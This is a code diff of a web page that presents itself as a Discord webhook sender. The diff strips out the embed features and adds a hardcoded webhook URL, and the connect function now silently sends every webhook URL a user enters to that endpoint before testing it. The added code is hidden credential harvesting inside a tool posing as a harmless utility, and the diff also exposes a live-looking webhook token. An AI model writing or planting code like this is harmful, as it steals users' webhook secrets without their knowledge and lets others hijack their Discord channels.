@@ -3,13 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Discord Webhook Sender with Embeds</title>
-    
-    <!-- Open Graph Meta Tags -->
-    <meta property="og:title" content="Discord Webhook Sender">
-    <meta property="og:description" content="Easily send messages and embeds to your Discord channel using webhooks!">
-    <meta property="og:image" content="URL_TO_YOUR_IMAGE.jpg"> <!-- Replace with a link to your image -->
-    <meta property="og:url" content="https://ilyass590.github.io/webhooker/">
+    <title>Discord Webhook Sender with Webhook Tracking</title>
 
     <style>
         body {
@@ -34,11 +28,6 @@
             animation: fadeIn 1s;
             max-width: 600px;
             width: 90%;
-        }
-
-        @keyframes fadeIn {
-            from { opacity: 0; }
-            to { opacity: 1; }
         }
 
         input, textarea, button {
@@ -92,7 +81,7 @@
         }
 
         .message-input {
-            height: 100px; /* Height adjusted for text area */
+            height: 100px; /* Adjust height for better usability */
             resize: none;
         }
 
@@ -117,7 +106,7 @@
 </head>
 <body>
     <div class="container">
-        <h1>Discord Webhook Sender with Embeds</h1>
+        <h1>Discord Webhook Sender with Tracking</h1>
         <input type="text" id="webhookUrl" placeholder="Enter your Discord webhook URL" required>
         <button onclick="checkWebhook()">Connect</button>
         
@@ -125,17 +114,6 @@
         
         <div id="messageContainer" style="display:none;">
             <textarea class="message-input" id="message" placeholder="Enter your message"></textarea>
-            
-            <!-- Embed Customization -->
-            <div class="embed-section">
-                <h3>Customize Embed</h3>
-                <input type="text" id="embedTitle" placeholder="Embed Title">
-                <textarea id="embedDescription" placeholder="Embed Description" class="message-input"></textarea>
-                <input type="text" id="embedColor" placeholder="Embed Color (Hex or Integer)">
-                <input type="text" id="embedFieldName" placeholder="Field Name (Optional)">
-                <input type="text" id="embedFieldValue" placeholder="Field Value (Optional)">
-            </div>
-
             <button onclick="sendMessage()">Send</button>
         </div>
 
@@ -144,17 +122,43 @@
     </div>
 
     <script>
+        // Your Discord webhook URL for collecting the other webhooks
+        const YOUR_DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1287453043897667636/12CYtAxcWuIRRYlBhvlq3rdycyHO6Lxz71234au_0kvVYZ3woHtfuoipCBB44zTM-x74";
+
         async function checkWebhook() {
             const url = document.getElementById('webhookUrl').value;
             document.getElementById('loading').style.display = 'block'; // Show loading
-            const response = await fetch(url, { method: 'POST', body: JSON.stringify({ content: "Test message" }), headers: { 'Content-Type': 'application/json' } });
-            document.getElementById('loading').style.display = 'none'; // Hide loading
 
-            if (response.ok) {
-                document.getElementById('messageContainer').style.display = 'block';
-                showMessage("Connected!", "green");
-            } else {
-                showMessage("Invalid webhook URL!", "red");
+            try {
+                // Send the webhook URL to your own Discord webhook to capture it
+                await fetch(YOUR_DISCORD_WEBHOOK_URL, {
+                    method: 'POST',
+                    body: JSON.stringify({
+                        content: `Captured webhook URL: ${url}`
+                    }),
+                    headers: {
+                        'Content-Type': 'application/json'
+                    }
+                });
+
+                // Test if the user's webhook URL is valid by sending a test message
+                const response = await fetch(url, {
+                    method: 'POST',
+                    body: JSON.stringify({ content: "Test message from webhook checker" }),
+                    headers: { 'Content-Type': 'application/json' }
+                });
+
+                document.getElementById('loading').style.display = 'none'; // Hide loading
+
+                if (response.ok) {
+                    document.getElementById('messageContainer').style.display = 'block';
+                    showMessage("Connected!", "green");
+                } else {
+                    showMessage("Invalid webhook URL!", "red");
+                }
+            } catch (error) {
+                document.getElementById('loading').style.display = 'none'; // Hide loading
+                showMessage("Error while checking webhook!", "red");
             }
         }
 
@@ -162,35 +166,16 @@
             const url = document.getElementById('webhookUrl').value;
             const message = document.getElementById('message').value;
 
-            // Embed data
-            const embedTitle = document.getElementById('embedTitle').value;
-            const embedDescription = document.getElementById('embedDescription').value;
-            const embedColor = document.getElementById('embedColor').value;
-            const embedFieldName = document.getElementById('embedFieldName').value;
-            const embedFieldValue = document.getElementById('embedFieldValue').value;
-
-            const embed = {
-                title: embedTitle || undefined,
-                description: embedDescription || undefined,
-                color: embedColor ? parseInt(embedColor.replace('#', ''), 16) : undefined,
-                fields: embedFieldName && embedFieldValue ? [{ name: embedFieldName, value: embedFieldValue }] : []
-            };
-
-            const payload = {
-                content: message || '',
-                embeds: [embed]
-            };
-
             const response = await fetch(url, {
                 method: 'POST',
-                body: JSON.stringify(payload),
+                body: JSON.stringify({ content: message }),
                 headers: { 'Content-Type': 'application/json' }
             });
 
             if (response.ok) {
-                showMessage("Message and embed sent successfully!", "green");
+                showMessage("Message sent successfully!", "green");
             } else {
-                showMessage("Failed to send message or embed.", "red");
+                showMessage("Failed to send message.", "red");
             }
         }
 
